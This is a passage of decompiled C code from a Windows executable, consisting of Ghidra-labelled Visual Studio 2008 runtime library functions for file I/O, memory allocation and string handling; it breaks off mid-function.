int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2008 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_00415186();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_00415186(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x004151b6:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x004151b6;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_0041533c;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          _memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_004152f8:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_0041533c;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_004152f8;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_0041533c:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_0041533c;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_004153c9();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_004153c9(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2008 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_004154d8();
  }
  return iVar2;
}



void FUN_004154d8(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  long lVar5;
  char *pcVar6;
  FILE *pFVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  pFVar7 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_c = __lseek(_FileHandle,0,1);
  if (local_c < 0) {
    return -1;
  }
  uVar1 = _File->_flag;
  if ((uVar1 & 0x108) == 0) {
    return local_c - _File->_cnt;
  }
  pcVar6 = _File->_ptr;
  pcVar8 = _File->_base;
  local_10 = (int)pcVar6 - (int)pcVar8;
  if ((uVar1 & 3) == 0) {
    if (-1 < (char)uVar1) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      return -1;
    }
  }
  else {
    pcVar2 = pcVar8;
    if ((*(byte *)((&DAT_00437d80)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) & 0x80)
        != 0) {
      for (; pcVar2 < pcVar6; pcVar2 = pcVar2 + 1) {
        if (*pcVar2 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar6 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_00437d80)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar5 = __lseek(_FileHandle,0,2);
          if (lVar5 == local_c) {
            pcVar6 = _File->_base;
            pcVar8 = pcVar6 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar7->_flag & 0x2000U) == 0;
          }
          else {
            lVar5 = __lseek(_FileHandle,local_c,0);
            if (lVar5 < 0) {
              return -1;
            }
            pFVar7 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar7 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_00437d80)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar7;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_c = local_c - (int)_File;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2008 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_004156e3();
  }
  return lVar2;
}



void FUN_004156e3(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2008 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_00437d58) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_00415733();
  }
  return local_20;
}



void FUN_00415733(void)

{
  FUN_0041be7c(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_00436454 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      if (DAT_00437d4c == 1) {
        dwBytes = _Size;
        if (_Size == 0) {
          dwBytes = 1;
        }
LAB_004157ab:
        piVar1 = (int *)HeapAlloc(DAT_00436454,0,dwBytes);
      }
      else if ((DAT_00437d4c != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0))
      {
        sVar3 = _Size;
        if (_Size == 0) {
          sVar3 = 1;
        }
        dwBytes = sVar3 + 0xf & 0xfffffff0;
        goto LAB_004157ab;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00436770 == 0) {
        piVar1 = __errno();
        *piVar1 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00415828;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00415828:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2008 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  _sprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _sprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,...)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,&stack0x00000010);
  return iVar1;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2008 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00433980) && ((p_Var2->_ownlocale & DAT_0043389c) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_004337a0) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_0043389c) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2008 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  localeinfo_struct local_34;
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_00415c1e;
  }
  local_c = 0;
  _C = *param_2;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = __iswctype_l(_C,8,&local_34);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_00415a0d:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_00415a0d;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_00415c1e:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_00415a8b;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_00415a8b;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_00415a8b:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_00415c1e;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_00436790 == 0) {
    ppuVar2 = &PTR_DAT_00433988;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  wchar_t wVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  puVar4 = (undefined4 *)_Dest;
  if (_Count != 0) {
    do {
      wVar1 = *_Source;
      *(wchar_t *)puVar4 = wVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      _Source = _Source + 1;
      if (wVar1 == L'\0') break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2008 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  
  if (_Memory != (void *)0x0) {
    if (DAT_00437d4c == 3) {
      __lock(4);
      puVar1 = (uint *)___sbh_find_block((int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_00415ced();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_00436454,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_00415ced(void)

{
  FUN_0041be7c(4);
  return;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_00415d35:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_00415d3e:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        _memcpy(_Dst,_Src,_MaxCount);
        goto LAB_00415d35;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_00415d3e;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar1;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2008 Release

int _xtow_s_20(uint param_1,uint param_2,uint param_3,int param_4)

{
  short *psVar1;
  short *in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  int iVar6;
  uint local_8;
  
  if (in_EAX == (short *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  if (param_2 == 0) {
LAB_00415dd6:
    piVar2 = __errno();
    iVar6 = 0x16;
  }
  else {
    *in_EAX = 0;
    if ((param_4 != 0) + 1 < param_2) {
      if (0x22 < param_3 - 2) goto LAB_00415dd6;
      psVar3 = in_EAX;
      if (param_4 != 0) {
        param_1 = -param_1;
        *in_EAX = 0x2d;
        psVar3 = in_EAX + 1;
      }
      local_8 = (uint)(param_4 != 0);
      psVar1 = psVar3;
      do {
        psVar4 = psVar1;
        sVar5 = (short)(param_1 % param_3);
        if (param_1 % param_3 < 10) {
          sVar5 = sVar5 + 0x30;
        }
        else {
          sVar5 = sVar5 + 0x57;
        }
        *psVar4 = sVar5;
        local_8 = local_8 + 1;
      } while ((param_1 / param_3 != 0) &&
              (psVar1 = psVar4 + 1, param_1 = param_1 / param_3, local_8 < param_2));
      if (local_8 < param_2) {
        psVar4[1] = 0;
        do {
          sVar5 = *psVar4;
          *psVar4 = *psVar3;
          *psVar3 = sVar5;
          psVar4 = psVar4 + -1;
          psVar3 = psVar3 + 1;
        } while (psVar3 < psVar4);
        return 0;
      }
      *in_EAX = 0;
    }
    piVar2 = __errno();
    iVar6 = 0x22;
  }
  *piVar2 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return iVar6;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_Val,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
